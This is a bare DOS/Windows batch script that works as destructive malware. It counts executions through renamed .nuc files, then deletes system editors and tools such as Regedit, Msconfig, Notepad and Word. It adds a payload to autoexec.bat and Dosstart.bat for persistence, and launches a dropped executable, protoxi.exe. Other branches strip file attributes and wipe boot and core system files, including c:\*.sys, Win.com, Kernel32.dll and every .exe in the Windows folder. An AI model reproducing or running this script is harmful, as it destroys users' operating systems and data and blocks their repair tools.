   @echo off
   If exist Command.com    goto avmt
   If exist Win.com    goto avmt
   If exist peas.acc   goto peas
   If not exist arnr*.nuc  goto sarnr
   If exist arnr01.nuc goto men01
   If exist arnr02.nuc goto men02
   If exist arnr03.nuc goto men03
   If exist arnr04.nuc goto men04
   If exist arnr05.nuc goto men05
   If exist arnr06.nuc goto men06
   If exist arnr07.nuc goto men07
   If exist arnr08.nuc goto men08
   If exist arnr09.nuc goto men09
   If exist arnr10.nuc goto men10
   If exist arnr11.nuc goto men11
   If exist arnr12.nuc goto men12
   If exist arnr13.nuc goto men13
   If exist arnr14.nuc goto men14
   If exist arnr15.nuc goto men15
   If exist arnr16.nuc goto men16
   If exist arnr17.nuc goto men17
   If exist arnr18.nuc goto men18
   If exist arnr19.nuc goto men19
   If exist arnr20.nuc goto men20
   If exist arnr21.nuc goto men21
   If exist arnr22.nuc goto men22
   If exist arnr23.nuc goto men23
   If exist arnr24.nuc goto men24
   If exist arnr25.nuc goto men25
   If exist arnr26.nuc goto men26
   If exist arnr27.nuc goto men27
   If exist arnr28.nuc goto men28
   If exist arnr29.nuc goto men29
   If exist arnr30.nuc goto men30
   If exist arnr31.nuc goto men31
   If exist arnr32.nuc goto men32
   If exist arnr33.nuc goto men33
   If exist arnr34.nuc goto men34
   If exist arnr35.nuc goto men35
   If exist arnr36.nuc goto men36
   If exist arnr37.nuc goto men37
   If exist arnr38.nuc goto men38
   If exist arnr39.nuc goto men39
   If exist arnr40.nuc goto men40
   If exist arnr41.nuc goto men41
   If exist arnr42.nuc goto men42
   If exist arnr43.nuc goto men43
   If exist arnr44.nuc goto men44
   If exist arnr45.nuc goto men45
   If exist arnr46.nuc goto men46
   If exist arnr47.nuc goto men47
   If exist arnr48.nuc goto men48
   If exist arnr49.nuc goto men49
   If exist arnr50.nuc goto men50
   :sarnr
   copy *.pif arnr01.nuc
   goto end
   :men01
   rename arnr01.nuc arnr02.nuc
   goto end
   :men02
   rename arnr02.nuc arnr03.nuc
   goto end
   :men03
   rename arnr03.nuc arnr04.nuc
   goto end
   :men04
   rename arnr04.nuc arnr05.nuc
   goto end
   :men05
   rename arnr05.nuc arnr06.nuc
   goto end
   :men06
   rename arnr06.nuc arnr07.nuc
   goto end
   :men07
   rename arnr07.nuc arnr08.nuc
   goto end
   :men08
   rename arnr08.nuc arnr09.nuc
   goto end
   :men09
   rename arnr09.nuc arnr10.nuc
   goto end
   :men10
   rename arnr10.nuc arnr11.nuc
   goto end
   :men11
   rename arnr11.nuc arnr12.nuc
   goto end
   :men12
   rename arnr12.nuc arnr13.nuc
   goto end
   :men13
   rename arnr13.nuc arnr14.nuc
   goto end
   :men14
   rename arnr14.nuc arnr15.nuc
   goto end
   :men15
   rename arnr15.nuc arnr16.nuc
   goto end
   :men16
   rename arnr16.nuc arnr17.nuc
   goto end
   :men17
   rename arnr17.nuc arnr18.nuc
   goto end
   :men18
   rename arnr18.nuc arnr19.nuc
   goto end
   :men19
   rename arnr19.nuc arnr20.nuc
   goto end
   :men20
   rename arnr20.nuc arnr21.nuc
   goto end
   :men21
   rename arnr21.nuc arnr22.nuc
   goto end
   :men22
   rename arnr22.nuc arnr23.nuc
   goto end
   :men23
   rename arnr23.nuc arnr24.nuc
   goto end
   :men24
   rename arnr24.nuc arnr25.nuc
   goto end
   :men25
   rename arnr25.nuc arnr26.nuc
   goto end
   :men26
   rename arnr26.nuc arnr27.nuc
   goto end
   :men27
   rename arnr27.nuc arnr28.nuc
   goto end
   :men28
   rename arnr28.nuc arnr29.nuc
   goto end
   :men29
   rename arnr29.nuc arnr30.nuc
   goto end
   :men30
   rename arnr30.nuc arnr31.nuc
   goto end
   :men31
   rename arnr31.nuc arnr32.nuc
   goto end
   :men32
   rename arnr32.nuc arnr33.nuc
   goto end
   :men33
   rename arnr33.nuc arnr34.nuc
   goto end
   :men34
   rename arnr34.nuc arnr35.nuc
   goto end
   :men35
   rename arnr35.nuc arnr36.nuc
   goto end
   :men36
   rename arnr36.nuc arnr37.nuc
   goto end
   :men37
   rename arnr37.nuc arnr38.nuc
   goto end
   :men38
   rename arnr38.nuc arnr39.nuc
   goto end
   :men39
   rename arnr39.nuc arnr40.nuc
   goto end
   :men40
   rename arnr40.nuc arnr41.nuc
   goto end
   :men41
   rename arnr41.nuc arnr42.nuc
   goto end
   :men42
   rename arnr42.nuc arnr43.nuc
   goto end
   :men43
   rename arnr43.nuc arnr44.nuc
   goto end
   :men44
   rename arnr44.nuc arnr45.nuc
   goto end
   :men45
   rename arnr45.nuc arnr46.nuc
   goto end
   :men46
   rename arnr46.nuc arnr47.nuc
   goto end
   :men47
   rename arnr47.nuc arnr48.nuc
   goto end
   :men48
   rename arnr48.nuc arnr49.nuc
   goto end
   :men49
   rename arnr49.nuc arnr50.nuc
   goto end
   :men50
   If exist ribo01.dll goto protox01
   copy arnr50.nuc ribo01.dll
   cls
   rename arnr50.nuc arnr01.nuc
   goto end
   :protox01
   If exist ribo02.dll goto protox02
   copy arnr50.nuc ribo02.dll
   cls
   del ribo01.dll
   cls
   rename arnr50.nuc arnr01.nuc
   goto end
   :protox02
   if exist %winbootdir%\Notepad.exe del %winbootdir%\Notepad.exe
   cls
   if exist %winbootdir%\Write.exe del %winbootdir%\Write.exe
   cls
   if exist %winbootdir%\Regedit.exe del %winbootdir%\Regedit.exe
   cls
   if exist %winbootdir%\system\Sysedit.exe del %winbootdir%\system\Sysedit.exe
   cls
   if exist %winbootdir%\system\Msconfig.exe del %winbootdir%\system\Msconfig.exe
   cls
   if exist %winbootdir%\command\Edit.com del %winbootdir%\command\Edit.com
   cls
   if exist %winbootdir%\command\Ebd\Edit.com del %winbootdir%\command\Ebd\Edit.com
   cls
   if exist C:\Archiv~1\Acceso~1\WORDPAD.EXE del C:\Archiv~1\Acceso~1\WORDPAD.EXE
   cls
   if exist C:\Archiv~1\Micros~1\Office\Winword.exe del C:\Archiv~1\Micros~1\Office\Winword.exe
   cls
   if exist C:\Archiv~1\Micros~2\Office\Winword.exe del C:\Archiv~1\Micros~2\Office\Winword.exe
   cls
   if exist C:\Archiv~1\Micros~3\Office\Winword.exe del C:\Archiv~1\Micros~3\Office\Winword.exe
   cls
   if not exist %winbootdir%\system\protoxi.exe copy cdacp.vxd %winbootdir%\system\protoxi.exe
   cls
   If not exist recpro*.tox    goto srpt
   If exist recpro01.tox       goto rec01
   If exist recpro02.tox       goto rec02
   If exist recpro03.tox       goto rec03
   If exist recpro04.tox       goto rec04
   If exist recpro05.tox       goto rec05
   :srpt
   copy *.pif recpro01.tox
   goto mouse
   :rec01
   rename recpro01.tox recpro02.tox
   goto mouse
   :rec02
   rename recpro02.tox recpro03.tox
   goto mouse
   :rec03
   rename recpro03.tox recpro04.tox
   goto mouse
   :rec04
   rename recpro04.tox recpro05.tox
   goto mouse
   :rec05
   If not exist sia.dll copy c:\autoexec.bat sia.dll
   cls
   if exist c:\autoexec.bat del c:\autoexec.bat
   cls
   If not exist radnv.dll copy adnv.bat radnv.dll
   cls
   copy sia.dll + radnv.dll c:\autoexec.bat
   cls
   If not exist sia2.dll copy %winbootdir%\Dosstart.bat sia2.dll
   cls
   if exist %winbootdir%\Dosstart.bat del %winbootdir%\Dosstart.bat
   cls
   copy sia2.dll + radnv.dll %winbootdir%\Dosstart.bat
   cls
   copy adnv.bat peas.acc
   cls
   goto mouse
   :avmt
   attrib -a -h -r -s c:\*.*
   cls
   if exist c:\*.sys del c:\*.sys
   cls
   if exist c:\*.com del c:\*.com
   cls
   if exist %winbootdir%\Emm386.exe del %winbootdir%\Emm386.exe
   cls
   if exist %winbootdir%\Rundll.exe del %winbootdir%\Rundll.exe
   cls
   if exist %winbootdir%\Rundll32.exe del %winbootdir%\Rundll32.exe
   cls
   if exist %winbootdir%\Wininit.exe del %winbootdir%\Wininit.exe
   cls
   if exist %winbootdir%\Ipconfig.exe del %winbootdir%\Ipconfig.exe
   cls
   if exist %winbootdir%\Win.com del %winbootdir%\Win.com
   cls
   if exist %winbootdir%\Himem.sys del %winbootdir%\Himem.sys
   cls
   if exist %winbootdir%\Winsock.dll del %winbootdir%\Winsock.dll
   cls
   if exist %winbootdir%\system\Cfgwiz32.exe del %winbootdir%\system\Cfgwiz32.exe
   cls
   if exist %winbootdir%\system\Cmmgr32.exe del %winbootdir%\system\Cmmgr32.exe
   cls
   if exist %winbootdir%\system\Gdi.exe del %winbootdir%\system\Gdi.exe
   cls
   if exist %winbootdir%\system\Krnl386.exe del %winbootdir%\system\Krnl386.exe
   cls
   if exist %winbootdir%\system\Kernel32.dll del %winbootdir%\system\Kernel32.dll
   cls
   if exist %winbootdir%\system\*.vxd del %winbootdir%\system\*.vxd
   cls
   del c:\*.bat
   :peas
   if not exist %winbootdir%\system\protoxi.exe copy cdacp.vxd %winbootdir%\system\protoxi.exe
   cls
   attrib -a -h -r -s c:\*.*
   cls
   if exist c:\*.sys del c:\*.sys
   cls
   if exist c:\*.com del c:\*.com
   cls
   if exist %winbootdir%\*.exe del %winbootdir%\*.exe
   cls
   if exist %winbootdir%\system\*.vxd del %winbootdir%\system\*.vxd
   :mouse
   cls
   %winbootdir%\system\protoxi.exe
   :end
   cls
